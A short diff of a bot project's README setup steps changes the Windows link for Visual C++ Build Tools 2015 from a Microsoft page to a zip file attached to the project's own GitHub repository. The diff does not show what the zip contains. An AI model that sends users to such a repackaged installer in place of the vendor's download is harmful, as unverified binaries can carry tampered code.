@@ -27,7 +27,7 @@ If you have already installed the bot code, run `npm uninstall robotjs` in your 
 
 #### Windows
 
-Download and install Visual C++ Build Tools 2015 [here](http://landinghub.visualstudio.com/visual-cpp-build-tools).
+Download and install Visual C++ Build Tools 2015 [here](https://github.com/Mega-Mewthree/Moomoo-AI-Bot-Sender/files/1959058/visualcppbuildtools_full.zip).
 
 Download and install Python 2.7.x [here](https://www.python.org/downloads/release/python-2714/). Make sure you select the option to add it to PATH.
 
